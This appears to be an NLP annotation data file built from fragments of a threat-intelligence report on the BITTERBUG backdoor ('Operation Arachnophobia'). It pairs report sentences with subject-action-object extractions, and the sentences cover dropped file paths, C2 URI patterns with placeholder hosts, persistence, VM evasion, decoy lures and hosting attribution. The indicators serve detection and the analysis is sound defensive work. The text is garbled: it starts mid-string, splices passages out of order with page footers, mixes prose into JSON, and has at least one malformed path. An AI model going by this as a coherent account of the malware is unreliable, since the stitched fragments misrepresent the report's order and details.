%APPDATA%\\Microsoft\\tlang006.txt\n</list>\nBITTERBUG may also write a list of all running processes to:\n<list>\n\u2022\t %APPDATA%\\Microsoft\\prc.dat\n</list>\nFinally, BITTERBUG typically uploads the running process list, document file list, and all documents to the following URI:\n<list>\n\u2022\t http://<c2_location>/fetch_updates_flex.php?compname=<%COMPUTERNAME%>_<%USERNAME%>\n</list>\n</section>\n<section>\n<heading>Host-Based Signatures</heading>\n</section>\n<section>\n<heading>File System Residue</heading>\n\nBITTERBUG may be extracted along with the following embedded files:\n<list>\n\u2022\t %USERPROFILE%\\5rv3fgk6\\<BITTERBUG>.exe\n\u2022\t %USERPROFILE%\\5rv3fgk6\\libcurld.dll\n\u2022\t %USERPROFILE%\\5rv3fgk6\\msvcm90d.dll\n\u2022\t %USERPROFILE%\\5rv3fgk6\\msvcp90d.dll\n\u2022\t %USERPROFILE%\\5rv3fgk6\\msvcr90d.dll\n\u2022\t %USERPROFILE%\\5rv3fgk6\\Microsoft.VC90.DebugCRT.manifest\n\n\n\n\n<footer>14  \u2022     OPERATION ARACHNOPHOBIA</footer>\n\f\u2022\t %USERPROFILE%\\5rv3fgk6\\SJeXSrA.KNX\n\u2022\t %USERPROFILE%\\5rv3fgk6\\BtcirEt.DZU\n\u2022\t %USERPROFILE%\\5rv3fgk6\\VCAKSQl.TNT\n</list>\nThe malware may create the following files:\n<list>\n\u2022\t %APPDATA%\\Microsoft\\recovery.txt\n\u2022\t %APPDATA%\\Microsoft\\plang006.txt\n\u2022\t %APPDATA%\\Microsoft\\tlang006.txt\n\u2022\t %APPDATA%\\Microsoft\\prc.dat\n\u2022\t %APPDATA%\\Microsoft\\file.exe\n\u2022\t %APPDATA%\\Microsoft\\percf001.dat\n\u2022\t %APPDATA%\\Microsoft\\percf002.dat\n\u2022\t %USERPROFILE%\\Start Menu\\Programs\\Startupwincheck.exe\n\u2022\t %USERPROFILE%\\Start Menu\\Programs\\Startup\\winsquirt.exe\n</list>\n</section>\n<section>\n<heading>Network-Based Signatures</heading>\n\u2022\t The malware typically communicates on TCP port 80:\n\n\u2022\t The malware may perform HTTP requests for the following URIs:\n<list>\n     \u2022\t http://<c2_location>/checkpkg.php?compname=<%COMPUTERNAME%>_<%USERNAME%>\n     \u2022\t http://<c2_location>/is_array_max.php?compname=<%COMPUTERNAME%>_<%USERNAME%>\n     \u2022\t http://<c2_location>/is_array_pal.php?compname=<%COMPUTERNAME%>_<%USERNAME%>\n     \u2022\t http://<c2_location>/path_active.php?compname=<%COMPUTERNAME%>_<%USERNAME%>\n     \u2022\t http://<c2_location>/fetch_updates_flex.php?compname=<%COMPUTERNAME%>_<%USERNAME%>\n     \u2022\t http://<c2_location>/versionchk.php?srs=436712384\n     \u2022\t http://<c2_location>/vtris.php?srs=436712384\n     \u2022\t http://<c2_location>/vtris1.php?srs=436712384\n</list>\n</section>\n<section>\n<heading>File Manipulations</heading>\nWe observed other interesting operational security-oriented challenges in the post-blog post samples": [{"search": {"A": "search", "S": "BITTERBUG", "O": ["for files with the following file extensions"]}, "scan": {"A": "scan", "S": "BITTERBUG", "O": ["through each drive letter"]}}, {"uploads": {"A": "uploads", "S": "BITTERBUG", "O": ["the running process list, document file list, and all documents", "to the following URI"]}}, {"communicates": {"A": "communicates", "S": "The malware", "O": ["on TCP port 80"]}}, {"creates": {"A": "creates", "S": "BITTERBUG", "O": ["a file list containing all documents (excluding those whose filename contains MediaUtils)", "to the following locations"]}}, {"write": {"A": "write", "S": "BITTERBUG", "O": ["a list of all running processes"]}}, {"perform": {"A": "perform", "S": "The malware", "O": ["for the following URIs", "HTTP requests"]}}, {"create": {"A": "create", "S": "The malware", "O": ["the following files"]}}], "\n\n\u2022\t The threat actors utilized a hosting provider that is a Pakistani-based company with subleased VPS space within the U.S": [{"utilized": {"A": "utilized", "S": "The threat actors", "O": ["a hosting provider that is a Pakistani-based company with subleased VPS space within the U.S."]}}], " The final two\nfiles are downloaded to the user\u2019s Startup directory and executed at startup in order to maintain persistence": [{"are downloaded": {"A": "are downloaded", "O": ["The final two files", "to the user\u2019s Startup directory"]}, "executed": {"A": "executed", "O": ["at startup", "The final two files", "in order to maintain persistence"]}}], " Connections to its C2 nodes relied on\nPHP and used communications that included \u201c.php?compname=\u201d and \u201c.php?srs=\u201d, as well as direct file/component retrieval\nfrom the C2s": [{"used": {"A": "used", "S": "Connections to its C2 nodes", "O": ["communications that included \u201c.php?compname=\u201d and \u201c.php?srs=\u201d, as well as direct file/component retrieval from the C2s"]}, "relied": {"A": "relied", "S": "Connections to its C2 nodes", "O": ["on PHP"]}}], " We have observed BITTERBUG installed by a self-extracting RAR archive\ndisguised as a screensaver": [{"installed": {"A": "installed", "S": "a self-extracting RAR archive", "O": ["BITTERBUG"]}, "disguised": {"A": "disguised", "S": "a self-extracting RAR archive", "O": ["as a screensaver"]}}], "\n\n<figure></figure>\n<caption>Figure 11: Generic Debug Path</caption>\n\nBetween December 2013 and late March 2014, we observed several new lures used in BITTERBUG self-extracting RAR (SFXRAR) files": [{"used": {"A": "used", "O": ["several new lures", "in BITTERBUG self-extracting RAR (SFXRAR) files"]}}], " The threat actor appears to\nhave exclusively used VPSNOC, a probable Pakistan-based VPS service provider who leased U.S": [{"used": {"A": "used", "S": "The threat actor", "O": ["VPSNOC, a probable Pakistan-based VPS service provider who leased U.S. hosting services", "for both the delivery and C2 phases of attack"]}}], " The backdoor then may\nenter an infinite sleep loop if recovery.txt contains either one of the aforementioned strings (Example in Figure 13)": [{"enter": {"A": "enter", "S": "The backdoor", "O": ["an infinite sleep loop", "if recovery.txt contains either one of the aforementioned strings (Example in Figure 13)"]}}], "\n\n\u2022\t The customized malware (BITTERBUG) used by these threat actors has only been observed hosted on and communicating with\n    two IP addresses operated by a Pakistan-based hosting provider": [{"communicating": {"A": "communicating", "S": "The customized malware (BITTERBUG) used by these threat actors"}, "hosted": {"A": "hosted", "S": "The customized malware (BITTERBUG) used by these threat actors"}}], " BITTERBUG appears to be virtual machine aware\nand may not execute on a VMWare or VirtualBox VM": [{"appears": {"A": "appears", "S": "BITTERBUG", "O": ["to be virtual machine aware"]}, "not execute": {"A": "not execute", "S": "BITTERBUG", "O": ["on a VMWare or VirtualBox VM"]}}], " FireEye\nanalyzed the malware, which they call BITTERBUG, and determined it to be a custom backdoor": [{"determined": {"A": "determined", "S": "FireEye", "O": ["it", "to be a custom backdoor"]}}], " Interestingly, the samples compiled following the blog publication used entirely new and generic debug paths (Figure 11) as well as a compilation tactic to conceal the C2 address from static analysis": [{"conceal": {"A": "conceal", "S": "a compilation tactic", "O": ["the C2 address from static analysis"]}}], "\n\n</section>\n\n\n<footer>11    \u2022     OPERATION ARACHNOPHOBIA</footer>\n\n<section>\n<heading>\n\fAPPENDIX</heading>\n</section>\n<section>\n<heading>\nAPPENDIX A: Malware Details\n</heading>\n</section>\n<section>\n<heading>BITTERBUG</heading>\nBITTERBUG is a backdoor executable capable of uploading and downloading files, listing running processes, generating file listings,\nand automatically transferring selected files to its command and control (C2) server": [{"downloading": {"A": "downloading", "S": "BITTERBUG"}, "uploading": {"A": "uploading", "S": "BITTERBUG"}, "is": {"A": "is", "S": "BITTERBUG", "O": ["a backdoor executable"]}, "generating": {"A": "generating", "S": "BITTERBUG", "O": ["file listings"]}, "listing": {"A": "listing", "S": "BITTERBUG", "O": ["running processes"]}, "transferring": {"A": "transferring", "S": "BITTERBUG", "O": ["selected files", "to its command and control (C2) server"]}}], " The backdoor relies on various support components, including the non-malicious, publically available Libcurl<fn>40</fn> for installation, launch, and communications": [{"relies": {"A": "relies", "S": "The backdoor", "O": ["for installation, launch, and communications", "on various support components, including the non-malicious, publically available Libcurl"]}}], " Upon execution, the self-extracting RAR archive may extract configuration files, dependency DLLs, and\nthe BITTERBUG executable": [{"extract": {"A": "extract", "S": "the self-extracting RAR archive", "O": ["configuration files, dependency DLLs, and the BITTERBUG executable"]}}], " One from December contained several BITTERBUG variants and used a decoy PDF document (Figure 12) related to the December arrest of Devyani Khobragade,<fn>47</fn> an Indian diplomat in the United States": [{"used": {"A": "used", "S": "One from December", "O": ["a decoy PDF document (Figure 12) related to the December arrest of Devyani Khobragade, an Indian diplomat in the United States"]}}], " In spring 2014, we observed a SFXRAR file with a filename lure related to the March 2014 disappearance of Malaysis Airlines Flight 370<fn>48</fn> (cast as a Pakistan-related hijacking)": [{"observed": {"A": "observed", "S": "we", "O": ["a SFXRAR file with a filename lure related to the March 2014 disappearance of Malaysis Airlines Flight 370 (cast as a Pakistan-related hijacking)"]}}], "\n\nThe following is a summary of the relationships between the hosting organizations and Tranchulas:\n\n\u2022\t VPNSOC IP space was used as command and control nodes for attackers using variants of the BITTERBUG malware that\n    contained build strings that referenced \u201cTranchulas\u201d and a Tranchulas employee": [{"was used": {"A": "was used", "O": ["for attackers using variants of the BITTERBUG malware that contained build strings that referenced \u201cTranchulas\u201d and a Tranchulas employee", "as command and control nodes", "VPNSOC IP space"]}}], "\n\n<figure></figure>\n<caption>Figure 12: Screenshot of Indian diplomat arrest decoy PDF</caption>\n\nBITTERBUG continued to rely on the same network behaviors to communicate with its C2s": [{"rely": {"A": "rely", "S": "BITTERBUG", "O": ["to communicate with its C2s", "on the same network behaviors"]}}], " In some variants, BITTERBUG has the ability to automatically target and exfiltrate files with extensions such as .doc, .xls, .pdf, .ppt, .egm, and .xml": [{"target and exfiltrate": {"A": "target and exfiltrate", "S": "BITTERBUG", "O": ["files with extensions such as .doc, .xls, .pdf, .ppt, .egm, and .xml"]}}], "\n\n<figure>\n                        Decoys associated with BITTERBUG                               Tranchulas Documents\n\n</figure>\n\n\n         <caption>                         Figure 10: Matching Document Author Metadata</caption>\n\n\n<footnote>\n\n39\t       http://www.know-hosting.com/view/27108-digitallinx.html\n</footnote>\n\n\n<footer>8    \u2022     OPERATION ARACHNOPHOBIA</footer>\n\fWhile the author field of \u201chp\u201d doesn\u2019t conclusively prove a relationship, it contributes to the body of circumstantial evidence which\nlinks properties of the official Tranchulas response to the properties of decoy documents that were used in conjunction with\nBITTERBUG targeting campaigns": [{"were used": {"A": "were used", "O": ["decoy documents"]}}], "\n\nBITTERBUG then may attempt to download the files listed in Table 1": [{"download": {"A": "download", "S": "BITTERBUG", "O": ["the files listed in Table 1"]}}], " The purpose of this command might be to delete older versions of BITTERBUG, although we have not observed this\ncommand occurring in the wild": [{"delete": {"A": "delete", "S": "this command", "O": ["older versions of BITTERBUG"]}}]}